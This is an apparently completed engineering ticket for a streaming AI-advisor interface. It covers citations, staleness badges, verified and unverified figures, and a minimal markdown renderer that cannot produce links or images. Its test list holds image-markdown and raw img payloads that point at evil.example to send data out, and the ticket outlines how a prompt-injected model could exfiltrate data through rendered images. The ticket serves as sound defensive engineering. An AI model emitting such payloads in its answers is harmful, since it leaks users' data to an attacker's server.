# 105 — Streaming answers: sources, staleness, unverified figures, and nothing that can load
Status: done
Wave: 10   Lane: W
Touches: none
Blocked by: 104
Integrates with: 099
Read first: docs/ADVISOR.md#grounding, docs/ADVISOR.md#prompt-injection

## Goal
An answer appears as it is written, says where every figure came from and how current it is, marks
any figure it could not verify, and cannot be made to fetch anything — whatever text the model was
tricked into producing.

## Acceptance criteria
- [x] `lib/advisor-stream.ts`: POSTs via `fetch` to a path built with `apiPath()`, parses SSE into
      `AdvisorEvent` typed from `api-types.ts`, and cancels through an `AbortController` — from a
      Stop button beside the answer, and on unmount.
- [x] Text deltas append to the current answer without re-rendering earlier turns. A "checking
      figures" state holds until `answer`, which replaces the streamed text with the checked
      version; `regenerating` is shown as such.
- [x] **Figures carry their status** in place: verified figures quietly, with their source on tap;
      matched figures unmarked; unverified figures visibly marked with a one-line reason.
- [x] **On the answer itself:** a "show lookups" control listing each tool call with its arguments,
      rows and time; and a flag control — *good* or *flagged*, with an optional note — saved
      through `PUT /advisor/turns/{turn_id}/feedback` without reloading the conversation.
- [x] Tool progress from `tool_call` events: a quiet line per lookup ("Spending by category, Q3").
- [x] Sources under each answer, from its citations: what was looked up, as of when, which scope, a
      stale badge. Limitations listed plainly ("The app has no liability terms yet").
- [x] `lib/markdown-lite.ts` renders paragraphs, emphasis, lists, tables and inline code, and
      **nothing else: no links, no images, no raw HTML.** URLs and `![…](…)` render as literal
      text. Screen tokens become in-app buttons through `lib/screens.ts`; unknown tokens render as
      text.
- [x] Error events read plainly: cap reached (with its reset date), refused, timed out, cancelled.
- [x] Tests (MSW streams): a full event sequence; an answer containing `![x](https://evil.example/?d=1)`,
      the reference-style form (`![x][1]` with `[1]: https://evil.example/?d=1`) and a raw
      `<img src=…>` produces **no `img` and no `a` element** in the DOM; flagging an answer saves
      without clearing the conversation; Stop aborts the
      fetch; an unverified figure is marked; regeneration replaces the text; a stale citation shows
      its badge.

## Files
- `web/src/lib/advisor-stream.ts` (new)
- `web/src/lib/markdown-lite.ts` (new)
- `web/src/components/advisor/conversation.tsx` (new)
- `web/src/components/advisor/answer.tsx` (new)
- `web/src/components/advisor/answer.test.tsx`

## Notes
A small hand-written renderer, not a markdown library with its dangerous features switched off. A
library's defaults change between versions; a renderer that has no code path for `<a>` or `<img>`
cannot be configured into one. This is one of three layers against image exfiltration — the API
strips, this cannot draw, and 106's CSP would block.

The Stop button sits on the answer being generated, where the owner's eye already is.

## Done — 2026-09-28

- `markdown-lite` parses to a tree whose node types are text, figure, strong, em, code and
  screen — **there is no link, image or HTML node to reach.** Figure spans are placed by their
  character offsets in the whole answer, inside bold and table cells too.
- Figures: verified ones are a dotted underline that shows their source on tap; matched ones are
  plain; unverified ones are a wavy underline with an "unverified" tag and their reason on tap.
- Streaming updates replace only the newest turn object, and `TurnCard` is memoised, so earlier
  turns do not re-render. Lookups show as quiet lines while the answer is written.
- The first question is sent a tick after mount, so React's development double-mount neither
  sends it twice nor cancels it. Leaving the screen aborts the stream.
- A 409 from a second tab reads as "still being written"; an abort reads as "Stopped."
- Checked on a phone viewport against this branch's API, with a real turn written by the loop
  and the scripted model: the list, the status line, and a conversation with verified, matched
  and unverified figures, sources, a limitation, lookups and feedback all lay out in one column.
